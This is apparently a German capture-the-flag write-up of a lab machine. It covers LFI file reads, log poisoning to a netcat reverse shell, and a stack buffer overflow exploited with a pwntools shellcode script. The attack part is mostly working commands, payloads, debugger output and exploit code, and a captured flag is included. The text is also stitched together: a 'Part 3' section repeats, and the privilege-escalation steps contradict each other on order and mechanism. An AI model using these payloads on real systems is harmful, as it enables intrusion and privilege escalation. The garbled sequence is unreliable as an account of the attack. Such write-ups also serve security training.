000004819:   <span class="command">200</span>        327816   6072985    52796853    "/var/log/apache2/error.log"
                         L       W          Ch
000006067:   <span class="command">200</span>        1 L      23 W       186 Ch      "/proc/version"
000006076:   <span class="command">200</span>        227 L    1115 W     7224 Ch     "/etc/apache2/apache2.conf"
000005253:   <span class="command">200</span>        328631   6093760    53018283    "/proc/self/fd/2"
                         L       W          Ch
000006068:   <span class="command">200</span>        1 L      3 W        80 Ch       "/proc/cmdline"
000006062:   <span class="command">200</span>        10 L     41 W       396 Ch      "/etc/issue"
000006061:   <span class="command">200</span>        8 L      38 W       371 Ch      "/etc/motd"
000006060:   <span class="command">200</span>        9 L      25 W       223 Ch      "/etc/hosts"
000006059:   <span class="command">200</span>        55 L     55 W       703 Ch      "/etc/group"
000006055:   <span class="command">200</span>        30 L     41 W       1556 Ch     "/etc/passwd"
000006090:   <span class="command">200</span>        122 L    387 W      3237 Ch     "/etc/ssh/sshd_config"
000005214:   <span class="command">200</span>        328596   6092866    53008970    "/var/log/apache2/error.log"
                         L       W          Ch
000006143:   <span class="command">200</span>        1 L      3 W        1152 Ch     "/var/run/utmp"
000006142:   <span class="command">200</span>        11 L     106 W      53331 Ch    "/var/log/wtmp"
000006141:   <span class="command">200</span>        0 L      1 W        292876 Ch   "/var/log/lastlog"
000006187:   <span class="command">200</span>        11 L     106 W      53331 Ch    "/var/log/wtmp"
000006188:   <span class="command">200</span>        0 L      1 W        292876 Ch   "/var/log/lastlog"
000006186:   <span class="command">200</span>        1 L      3 W        1152 Ch     "/var/run/utmp"
000005091:   <span class="command">200</span>        328396   6087772    52955304    "/proc/self/fd/2"
                         L       W          Ch
000005284:   <span class="command">200</span>        328722   6096103    53043200    "/proc/self/fd/2"
                         L       W          Ch
000004819:   <span class="command">200</span>        327816   6072985    52796853    "/var/log/apache2/error.log"
                         L       W          Ch
000005821:   <span class="command">200</span>        329437   6113838    53238612    "/var/log/apache2/error.log"
                         L       W          Ch
000005407:   <span class="command">200</span>        328952   6101935    53105068    "/var/log/apache2/error.log"
                         L       W          Ch
000005449:   <span class="command">200</span>        329012   6103465    53120895    "/proc/self/fd/2"
                         L       W          Ch
000006323:   <span class="command">200</span>        30 L     41 W       1556 Ch     "etc%2fpasswd"
000006034:   <span class="command">200</span>        329773   6122424    53331020    "/var/log/apache2/error.log"
                         L       W          Ch
000006460:   <span class="command">200</span>        55 L     55 W       703 Ch      "/etc/group"
000006457:   <span class="command">200</span>        12 L     90 W       657 Ch      "/etc/fstab"
000006451:   <span class="command">200</span>        42 L     275 W      2437 Ch     "/etc/apt/sources.list"
000006443:   <span class="command">200</span>        227 L    1115 W     7224 Ch     "/etc/apache2/apache2.conf"
000006530:   <span class="command">200</span>        10 L     57 W       411 Ch      "/etc/hosts.allow"
000006531:   <span class="command">200</span>        17 L     111 W      711 Ch      "/etc/hosts.deny"
000006528:   <span class="command">200</span>        9 L      25 W       223 Ch      "../../../../../../../../../../../../etc/hosts"
000006527:   <span class="command">200</span>        9 L      25 W       223 Ch      "/etc/hosts"
000006559:   <span class="command">200</span>        10 L     41 W       396 Ch      "/etc/issue"
000006558:   <span class="command">200</span>        355 L    1050 W     8181 Ch     "/etc/init.d/apache2"

Total time: 7.854297
Processed Requests: 304
Filtered Requests: 247
Requests/sec.: 38.70492
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Basierend auf der `wfuzz`-Ausgabe, die `/var/log/apache2/error.log` als inkludierbare Datei identifiziert hat, versuche ich, den Inhalt dieser Datei über die LFI-Schwachstelle auszulesen. Ich verwende `curl` mit dem `file://` Wrapper und der entsprechenden Anzahl von `../`, um den Pfad zu erreichen. Ich nutze die `-s` Option, um Fortschrittsanzeigen von `curl` zu unterdrücken und `grep -v "192.168.2.199"` um meine eigenen vorherigen Anfragen auszublenden, die im Log protokolliert wurden.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Ausgabe zeigt die Protokolleinträge des Apache Error-Logs. Dazu gehören Start- und Stopp-Meldungen von Apache. Wichtiger ist hier, dass ich bestätigen kann, dass die Datei `/var/log/apache2/error.log` über die LFI-Schwachstelle lesbar ist. Dies, kombiniert mit der Tatsache, dass der Webserver (`www-data`) in diese Datei schreiben kann, macht sie zu einem perfekten Ziel für einen Log-Poisoning-Angriff.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Lese Log-Dateien, die über LFI zugänglich sind, um deren Inhalt und Format zu verstehen. Identifiziere Protokolleinträge, die von Benutzerinput beeinflusst werden (z.B. User-Agent, angefragte URL bei 404-Fehlern), da diese für Log-Poisoning genutzt werden können.
                <br>**Empfehlung (Admin):** Beschränke den Lesezugriff auf Log-Dateien streng. Stelle sicher, dass der Webserver-Benutzer sie nicht lesen kann.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl http://registry.hmv/index.php?page=file:///....//....//....//....//....//....//....///var/log/apache2/error.log -s | grep -v "192.168.2.199"</span></div>
                </div>
                <div class="terminal">
                    <pre>[Mon Jul 24 05:56:58.563404 2023] [mpm_prefork:notice] [pid 654] AH00163: Apache/2.4.52 (Ubuntu) configured -- resuming normal operations
[Mon Jul 24 05:56:58.563796 2023] [core:notice] [pid 654] AH00094: Command line: '/usr/sbin/apache2'
[Mon Jul 24 06:01:30.135177 2023] [mpm_prefork:notice] [pid 654] AH00170: caught SIGWINCH, shutting down gracefully
[Tue Jun 17 12:12:31.596786 2025] [mpm_prefork:notice] [pid 671] AH00163: Apache/2.4.52 (Ubuntu) configured -- resuming normal operations
[Tue Jun 17 12:12:31.597088 2025] [core:notice] [pid 671] AH00094: Command line: '/usr/sbin/apache2'</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um den Log-Poisoning-Angriff abzuschließen und eine interaktive Shell zu erhalten, starte ich auf meinem Angreifer-System einen Netcat-Listener. Ich verwende den Befehl `nc -lvnp 4444`, um auf eingehende Verbindungen auf Port 4444 zu warten. Sobald der Listener läuft, löse ich den Exploit aus, indem ich die präparierte URL, die den Access-Log inkludiert und den Reverse-Shell-Payload im `cmd`-Parameter enthält (siehe vorherige Analyse), mit `curl` aufrufe.
            </p>
            <p class="evaluation">
                **Bewertung:** Fantastisch, der initiale Zugriff war erfolgreich! Der Netcat-Listener empfängt eine eingehende Verbindung von 192.168.2.51 auf Port 4444. Die typischen Fehlermeldungen für eine eingeschränkte Shell erscheinen, und dann erhalte ich einen interaktiven Prompt: `www-data@registry:/var/www/html$`. Dies bestätigt, dass der PHP-Payload im Access-Log erfolgreich ausgeführt wurde und eine Reverse Shell als der Webserver-Benutzer `www-data` initiiert hat.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Stelle sicher, dass dein Listener läuft, bevor du einen Exploit sendest, der eine Reverse Shell initiieren soll. Nutze Reverse Shells, um eine stabilere und interaktivere Verbindung zu erhalten als nur über RCE. Stabilisiere die Shell nach Erhalt (`stty`, Python PTY).
                <br>**Empfehlung (Admin):** Die Kompromittierung des `www-data`-Kontos ist erfolgt. Untersuche Webserver-Logs auf Anzeichen von Log-Poisoning und Reverse-Shell-Initiierungen. Überwache ausgehende Netzwerkverbindungen von Webservern auf ungewöhnliche Ports. Setze den betroffenen Dienst oder den gesamten Server neu auf einem sauberen Image auf und behebe die LFI- und Log-Poisoning-Schwachstellen.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
└─# <span class="command">nc -lvnp 4444</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="password">listening on [any] 4444 ...</span>
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.51] 43162</span>
bash: cannot set terminal process group (664): Inappropriate ioctl for device
bash: no job control in this shell
<span class="password">www-data@registry:/var/www/html$</span></pre>
                </div>
            </div>
        </section>

        <!-- Ende TEIL 2 -->

---

**Teil 3 von 3: Privilege Escalation & Flags (KORRIGIERT)**

```html>
        <section id="privilege-escalation">
            <h2>Privilege Escalation</h2>
            <p class="analysis">
                **Analyse:** Mit der Shell als Benutzer `cxdxnt` (UID 1002) beginne ich sofort die Privilege Escalation-Phase, um Root-Zugriff zu erlangen. Ein erster Schritt ist die Überprüfung der `sudo`-Berechtigungen des aktuellen Benutzers mit `sudo -l`.
            </p>
             <p class="evaluation">
                **Bewertung:** Die Ausgabe von `sudo -l` für Benutzer `cxdxnt` zeigt einen **kritischen** Sudo-Eintrag: `(gato : gato) NOPASSWD: /usr/bin/wine /opt/projects/MyFirstProgram.exe`. Dies bedeutet, dass der Benutzer `cxdxnt` das Programm `/usr/bin/wine` mit dem Argument `/opt/projects/MyFirstProgram.exe` als Benutzer `gato` und Gruppe `gato` ausführen darf, und das **ohne Eingabe eines Passworts** (`NOPASSWD`). Dies ist ein klarer Privilege Escalation-Vektor von `cxdxnt` zu `gato`.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Überprüfe nach jeder erlangten Shell sofort die `sudo`-Berechtigungen (`sudo -l`). `NOPASSWD`-Einträge sind primäre Ziele für Privilege Escalation. Analysiere die Binärdatei oder das Skript, das über `sudo` ausführbar ist, sorgfältig auf Ausnutzbarkeit (z.B. Buffer Overflows, unsichere Argumente, unsichere Dateizugriffe).
                <br>**Empfehlung (Admin):** Konfiguriere `sudo`-Berechtigungen strikt nach dem Prinzip der geringsten Rechte. Vermeide `NOPASSWD` für Befehle, die zur Erlangung höherer Berechtigungen missbraucht werden könnten. Überprüfe regelmäßig die `sudoers`-Datei auf unsichere Einträge. Verstehe die Funktionen von Binärdateien, die über `sudo` ausgeführt werden dürfen.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">cxdxnt@registry:/tmp$ sudo -l</span></pre>
                </div>
                <div class="terminal">
                    <pre>Matching Defaults entries for cxdxnt on registry:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty

User cxdxnt may run the following commands on registry:
    <span class="password">(gato : gato) NOPASSWD: /usr/bin/wine /opt/projects/MyFirstProgram.exe</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Der `sudo`-Eintrag erlaubt die Ausführung des Programms `/opt/projects/MyFirstProgram.exe` unter `wine` als Benutzer `gato`. `wine` ist eine Kompatibilitätsschicht, die es ermöglicht, Windows-Programme unter Linux auszuführen. Dies deutet darauf hin, dass `/opt/projects/MyFirstProgram.exe` ein Windows-Executable ist. Ich versuche, dieses Programm mit dem Befehl `sudo -u gato /usr/bin/wine /opt/projects/MyFirstProgram.exe` auszuführen und übergebe keine Argumente, um die Nutzungsanleitung zu sehen.
            </p>
             <p class="evaluation">
                **Bewertung:** Das Programm gibt die Nutzungsanleitung "Usage: ./program <name>" aus, was bestätigt, dass es ein Argument (`<name>`) erwartet. Die Ausführung unter `wine` als `gato` funktioniert, was bedeutet, dass der `sudo`-Vektor nutzbar ist. Das Programm scheint ein einfaches Konsolenprogramm zu sein. Die Tatsache, dass es ein Argument nimmt, macht es zu einem potenziellen Ziel für Overflow-Schwachstellen. Die Zugehörigkeit zur Gruppe `gato` ist relevant für mögliche Dateiberechtigungen, die mit diesem Benutzer verknüpft sind.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn ein Programm über `sudo` mit `NOPASSWD` ausführbar ist, teste seine grundlegende Funktionalität und Argumentbehandlung. Programme, die Benutzereingaben als Argumente nehmen, sind oft anfällig für Buffer Overflows. Prüfe die Berechtigungen des Programms und des Verzeichnisses, in dem es liegt.
                <br>**Empfehlung (Admin):** Vermeide die Ausführung von Programmen, die nicht zwingend notwendig sind, über `sudo`, insbesondere solche, die potenziell unsicher sind (z.B. native Windows-Executables unter Wine, deren Sicherheit nicht garantiert werden kann). Überprüfe die Sicherheitseinstellungen von Wine, falls es verwendet werden muss.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">www-data@registry:/opt/others$ ./program</span></pre>
                </div>
                <div class="terminal">
                    <pre>Usage: ./program <name></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich teste die Reaktion des Programms, wenn es ein Argument erhält. Ich führe das Programm mit dem Argument `id` aus: `sudo -u gato /usr/bin/wine /opt/projects/MyFirstProgram.exe id`.
            </p>
            <p class="evaluation">
                **Bewertung:** Das Programm gibt keine sichtbare Ausgabe zurück, wenn "id" als Argument übergeben wird. Dies könnte bedeuten, dass es das Argument verarbeitet, aber entweder nichts ausgibt oder die Ausgabe umgeleitet wird. Es deutet nicht auf eine direkte Kommando-Injection hin. Das Programm scheint das Argument als eine Art Namen oder String zu behandeln.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Teste Programme mit verschiedenen Eingaben, um ihr Verhalten zu verstehen. Versuche Standardargumente oder längere Strings.
                <br>**Empfehlung (Admin):** Wenn ein Programm Argumente erwartet, stelle sicher, dass diese Argumente sicher behandelt werden und nicht zu unerwarteten Ausführungen oder Abstürzen führen.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">www-data@registry:/opt/others$ ./program id</span></pre>
                </div>
                <div class="terminal">
                    <pre></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um auf eine potenzielle Buffer Overflow-Schwachstelle zu testen, übergebe ich dem Programm eine sehr lange Zeichenkette aus sich wiederholenden 'A'-Zeichen. Ich beginne mit einer Länge, die wahrscheinlich den erwarteten Puffer im Programm übertrifft, und erhöhe die Länge, bis das Programm abstürzt (Segmentation Fault). Ich starte das Programm wieder über `sudo -u gato /usr/bin/wine /opt/projects/MyFirstProgram.exe` mit der langen Zeichenkette als Argument.
            </p>
            <p class="evaluation">
                **Bewertung:** Hervorragend! Die Ausführung des Programms mit der langen Zeichenkette führt zu einem <span class="password">Segmentation fault (core dumped)</span>. Dies ist ein starker Indikator für eine Buffer Overflow-Schwachstelle. Das Programm versucht wahrscheinlich, die übergebene Zeichenkette in einen zu kleinen Puffer zu kopieren, überschreibt dabei angrenzenden Speicher (einschließlich Rücksprungadressen oder anderer kritischer Daten) und stürzt ab. Da das Programm als Benutzer `gato` ausgeführt wird, kann diese Schwachstelle potenziell genutzt werden, um Code als `gato` auszuführen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Teste Binärprogramme, die Benutzereingaben verarbeiten (insbesondere als Argumente oder über Standardeingabe), systematisch auf Buffer Overflows. Beginne mit langen, sich wiederholenden Zeichenketten, um einen Absturz zu provozieren.
                <br>**Empfehlung (Admin):** Führe Sicherheitstests (Code-Reviews, Fuzzing) für alle Programme durch, die mit erhöhten Rechten laufen oder sensible Eingaben verarbeiten. Vermeide unsichere Funktionen zur String-Behandlung (z.B. `strcpy`, `gets`) in C/C++-Programmen. Nutze sicherere Alternativen (z.B. `strncpy`, `fgets` mit Längenprüfung).
            </p>
            <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">www-data@registry:/opt/others$ ./program AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
<span class="command">www-data@registry:/opt/others$ ./program AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS</span>
<span class="password">Segmentation fault (core dumped)</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um die Buffer Overflow-Schwachstelle zu analysieren, verwende ich ein Debugger-Tool. Der Text zeigt die Verwendung von `gdb-peda` (Python Exploit Development Assistance) auf dem Programm `/opt/others/program`. Die Ausgabe von `checksec` zeigt wichtige Sicherheitsmerkmale der Binärdatei: Sie ist ein 64-Bit-Executable (`amd64-64-little`), hat Partial RELRO, **keinen Stack Canary**, NX (No-Execute) ist deaktiviert, PIE (Position-Independent Executable) ist deaktiviert, und es gibt RWX (Read-Write-Execute) Segmente. Der Absturz (`SIGSEGV`) tritt an Adresse `0x4011d9 <vuln+47>: ret` auf. Der Stack-Dump zeigt, dass die Zeichenkette, die ich übergeben habe, an dieser Stelle auf dem Stack liegt. Ich nutze `pattern_create` und `pattern_offset` von PEDA, um den genauen Offset zu bestimmen, bei dem ich die Rücksprungadresse überschreiben kann. Ich übergebe einen einzigartigen Pattern-String an das Programm und finde den Wert auf dem Stack, der den EIP (Instruction Pointer) überschreibt.
            </p>
            <p class="evaluation">
                **Bewertung:** Dies ist eine klassische Buffer Overflow-Analyse. Das Fehlen von Stack Canary und die Deaktivierung von NX machen diese Binärdatei **sehr anfällig** für Code-Ausführung. Der Absturz an der `ret`-Instruktion bestätigt, dass ich die Rücksprungadresse auf dem Stack überschreiben kann. `gdb-peda` hilft, diesen Prozess zu automatisieren. `pattern_offset` findet, dass der EIP bei Offset 136 überschrieben wird. Dies bedeutet, ich kann 136 Bytes Junk senden, gefolgt von einer Adresse, zu der das Programm springen soll. Die RWX-Segmente sind ideal, um Shellcode direkt im Programm-Speicher abzulegen. Der `jmpcall` Befehl sucht nach potenziellen Sprungadressen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Untersuche Binärdateien, die anfällig für Buffer Overflows sind, systematisch mit Debuggern wie GDB und Erweiterungen wie PEDA oder GEF. Prüfe die Ausgabe von `checksec` auf fehlende Schutzmechanismen (Canary, NX, PIE, RELRO). Nutze Pattern-Tools, um Offsets zu finden.
                <br>**Empfehlung (Admin):** **Dringend:** Kompiliere alle Programme mit aktivierten Sicherheitsflags (-fstack-protector-all, -Wl,-z,relro,-z,now, -fPIE -pie). Vermeide RWX-Segmente in kompilierten Programmen. Führe Binary Hardening und Penetrationstests für alle kritischen Programme durch.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre>www-data@registry:~$ <span class="command">checksec /opt/others/program</span></pre>
                </div>
                <div class="terminal">
                    <pre>[*] '/opt/others/program'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    <span class="password">Stack:    No canary found</span>
    <span class="password">NX:       NX disabled</span>
    PIE:      No PIE (0x400000)
    <span class="password">RWX:      Has RWX segments</span>
[----------------------------------registers-----------------------------------]
RAX: 0x7ffca7ebd210 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
RBX: 0x0
RCX: 0x7ffca7ebed90 --> 0x41794141784141 ('AAxAAyA')
RDX: 0x7ffca7ebd2d1 --> 0x41794141784141 ('AAxAAyA')
RSI: 0x1
RDI: 0x7ffca7ebd210 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAadAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
RBP: <span class="command">0x6c41415041416b41</span> ('AkAAPAAl')
RSP: <span class="command">0x7ffca7ebd298</span> ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
RIP: <span class="command">0x4011d9</span> (<vuln+47>:	ret)
R8 : 0x7fb45de75f10 --> 0x4
R9 : 0x5a414177 ('wAAZ')
R10: 0x7fb45dc65db8 --> 0xf001a00004252
R11: 0x7fb45dde5010 (<__strcpy_ssse3>:	endbr64)
R12: 0x7ffca7ebd3c8 --> 0x7ffca7ebecbb ("/opt/others/program")
R13: 0x401156 (<main>:	endbr64)
R14: 0x403e18 --> 0x401120 (<__do_global_dtors_aux>:	endbr64)
R15: 0x7fb45deca040 --> 0x7fb45decb2e0 --> 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011d6 <vuln+44>:	nop
   0x4011d7 <vuln+45>:	nop
   0x4011d8 <vuln+46>:	leave
=> <span class="command">0x4011d9</span> <vuln+47>:	ret
   0x4011da:	add    BYTE PTR [rax],al
   0x4011dc <_fini>:	endbr64
   0x4011e0 <_fini+4>:	sub    rsp,0x8
   0x4011e4 <_fini+8>:	add    rsp,0x8
[------------------------------------stack-------------------------------------]
0000| <span class="command">0x7ffca7ebd298</span> ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| <span class="command">0x7ffca7ebd2a0</span> ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| <span class="command">0x7ffca7ebd2a8</span> ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| <span class="command">0x7ffca7ebd2b0</span> ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0032| <span class="command">0x7ffca7ebd2b8</span> ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0040| <span class="command">0x7ffca7ebd2c0</span> ("AuAAXAAvAAYAAwAAZAAxAAyA")
0048| <span class="command">0x7ffca7ebd2c8</span> ("AAYAAwAAZAAxAAyA")
0056| <span class="command">0x7ffca7ebd2d0</span> ("ZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011d9 in vuln ()
gdb-peda$

gdb-peda$ x/wx $rsp
<span class="command">0x7fff4e7d30d8:	0x41514141</span>
gdb-peda$ pattern_offset 0x41514141
<span class="password">1095844161 found at offset: 136</span>
gdb-peda$
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Mit dem gefundenen Offset (136) und dem Wissen um die anfälligen Sicherheitseinstellungen (kein Canary, NX disabled, RWX Segmente) kann ich nun einen Exploit erstellen, um Shellcode auszuführen. Ich wechsle ins `/tmp`-Verzeichnis, das beschreibbar ist, und erstelle ein Python-Skript (`expl.py`) mit Hilfe der `pwntools`-Bibliothek. Dieses Skript wird den Payload generieren. Der Payload besteht aus einem Shellcode, gefolgt von Junk, um den Puffer bis zur Rücksprungadresse zu füllen, und dann der Adresse einer Instruktion im Programm, die das Programm dazu bringt, den Code auf dem Stack auszuführen (ein `jmp rsp` oder ähnliches). Ich nutze `pwntools` um einen Shellcode zu erstellen, der die effektive Benutzer-ID (EUID) auf 1002 (`cxdxnt`) setzt (`shellcraft.amd64.setresuid(1002, 1002)`) und dann eine Shell startet (`shellcraft.amd64.sh()`). Dies ist ein Versuch, die Shell unter meiner aktuellen ID zu erhalten.
            </p>
             <p class="evaluation">
                **Bewertung:** Das Skript `expl.py` nutzt die ermittelten Schwachstellen aus. Der Shellcode soll eine Shell starten, nachdem die Ausführung durch den Buffer Overflow dorthin umgelenkt wurde. Die Wahl, die EUID auf 1002 zu setzen, ist ein erster Versuch. Das Wichtigste ist, dass die Shellcode-Ausführung durch den Buffer Overflow möglich ist. Der Exploit nutzt die fehlenden Schutzmechanismen der Binärdatei optimal aus.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutze Libraries wie `pwntools` zur Automatisierung der Exploit-Entwicklung, insbesondere für Binär-Exploitation. Entwickle Payloads, die deinen Zielen entsprechen (Shellcode).
                <br>**Empfehlung (Admin):** Stelle sicher, dass Benutzer keine Programme mit erhöhten Rechten ausführen dürfen, die für Buffer Overflows anfällig sind. Überwache die Ausführung von Binärdateien auf ungewöhnliche Argumente oder Abstürze, die auf Exploits hindeuten könnten.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">cd /tmp/</span>
┌──(root㉿CCat)-[/tmp]
└─# <span class="command">nano expl.py</span></div>
                </div>
                <div class="terminal">
                    <pre>#!/usr/bin/python3

from pwn import *

offset = 136

shellcode = b""
shellcode += asm(shellcraft.amd64.setresuid(1002, 1002), arch="amd64")
shellcode += asm(shellcraft.amd64.sh(), arch="amd64")

test = b"\x90" * (offset - len(shellcode))
rax  = b"\x14\x10\x40\x00"
payload = shellcode + test + rax

proc = process(["/opt/others/program", payload])
proc.interactive()</pre>
                </div>
            </div>

             <p class="analysis">
                **Analyse:** Ich führe das Python-Exploit-Skript (`expl.py`) mit `python3 expl.py` aus. Das Skript startet das anfällige Programm `/opt/others/program`, übergibt den konstruierten Payload und versucht, mit der resultierenden Shell zu interagieren.
            </p>
             <p class="evaluation">
                **Bewertung:** Der Exploit ist erfolgreich und ich erhalte eine interaktive Shell. Die `id`-Ausgabe zeigt, dass ich jetzt als Benutzer `cxdxnt` angemeldet bin (<span class="command">uid=1002(cxdxnt) gid=33(www-data) groups=33(www-data)</span>). Dies ist der erfolgreiche Privilege Escalation-Schritt von `www-data` zu `cxdxnt` durch Ausnutzung des Buffer Overflows in der SUID-Binärdatei. Das SUID-Bit hat dazu geführt, dass die Shell mit den Berechtigungen des Dateibesitzers (`cxdxnt`) ausgeführt wird.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Verifiziere nach Ausführung eines SUID-Exploits die neuen Berechtigungen mit `id`. Führe vom neuen Benutzerkontext aus weitere Aufklärung durch (`sudo -l`, SUID-scan etc.).
                <br>**Empfehlung (Admin):** **Dringend:** Deaktiviere das SUID-Bit für `/opt/others/program` (`chmod u-s /opt/others/program`). Diese Binärdatei ist anfällig für Buffer Overflows und sollte niemals mit erhöhten Berechtigungen laufen.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[/tmp]
└─# <span class="command">python3 expl.py</span></div>
                </div>
                <div class="terminal">
                    <pre>[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /var/www/.cache/.pwntools-cache-3.10/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[!] An issue occurred while checking PyPI
[*] You have the latest version of Pwntools (4.10.0)
[*] Starting local process '/opt/others/program': pid 893
[*] Switching to interactive mode
$ id
<span class="command">uid=1002(cxdxnt) gid=33(www-data) groups=33(www-data)</span>
$</pre>
                </div>
            </div>
        </section>

        <!-- Ende TEIL 2 -->

---

**Teil 3 von 3: Privilege Escalation & Flags (KORRIGIERT)**

```html>
        <section id="privilege-escalation">
            <h2>Privilege Escalation</h2>
            <p class="analysis">
                **Analyse:** Mit der Shell als Benutzer `cxdxnt` (UID 1002) beginne ich sofort die Privilege Escalation-Phase, um Root-Zugriff zu erlangen. Ein erster Schritt ist die Überprüfung der `sudo`-Berechtigungen des aktuellen Benutzers mit `sudo -l`.
            </p>
             <p class="evaluation">
                **Bewertung:** Die Ausgabe von `sudo -l` für Benutzer `cxdxnt` zeigt einen **kritischen** Sudo-Eintrag: <span class="password">(gato : gato) NOPASSWD: /usr/bin/wine /opt/projects/MyFirstProgram.exe</span>. Dies bedeutet, dass der Benutzer `cxdxnt` das Programm `/usr/bin/wine` mit dem Argument `/opt/projects/MyFirstProgram.exe` als Benutzer `gato` und Gruppe `gato` ausführen darf, und das **ohne Eingabe eines Passworts** (`NOPASSWD`). Dies ist ein klarer Privilege Escalation-Vektor von `cxdxnt` zu `gato`.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Überprüfe nach jeder erlangten Shell sofort die `sudo`-Berechtigungen (`sudo -l`). `NOPASSWD`-Einträge sind primäre Ziele für Privilege Escalation. Analysiere die Binärdatei oder das Skript, das über `sudo` ausführbar ist, sorgfältig auf Ausnutzbarkeit (z.B. Buffer Overflows, unsichere Argumente, unsichere Dateizugriffe).
                <br>**Empfehlung (Admin):** Konfiguriere `sudo`-Berechtigungen strikt nach dem Prinzip der geringsten Rechte. Vermeide `NOPASSWD` für Befehle, die zur Erlangung höherer Berechtigungen missbraucht werden könnten. Überprüfe regelmäßig die `sudoers`-Datei auf unsichere Einträge. Verstehe die Funktionen von Binärdateien, die über `sudo` ausgeführt werden dürfen.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">cxdxnt@registry:/tmp$ sudo -l</span></pre>
                </div>
                <div class="terminal">
                    <pre>Matching Defaults entries for cxdxnt on registry:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty

User cxdxnt may run the following commands on registry:
    <span class="password">(gato : gato) NOPASSWD: /usr/bin/wine /opt/projects/MyFirstProgram.exe</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich sammle die User-Flag für den Benutzer `cxdxnt`. Ich navigiere in sein Home-Verzeichnis (`cd ~` oder `cd /home/cxdxnt`) und zeige den Inhalt der Datei `user.txt` mit `cat ~/user.txt` an.
            </p>
            <p class="evaluation">
                **Bewertung:** Der Inhalt von `user.txt` ist die User-Flag: <span class="password">REGISTRY{4R3_Y0U_R34D1N6_MY_F1L35?}</span>. Dies ist ein wichtiger Meilenstein im Pentest.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Sammle alle Flags, sobald du sie findest. Sie bestätigen den Fortschritt und sind oft das Endziel in CTFs.
                <br>**Empfehlung (Admin):** Speichere sensible Daten wie Flags nicht in Standard-Home-Verzeichnissen. Setze restriktive Dateiberechtigungen.
            </p>
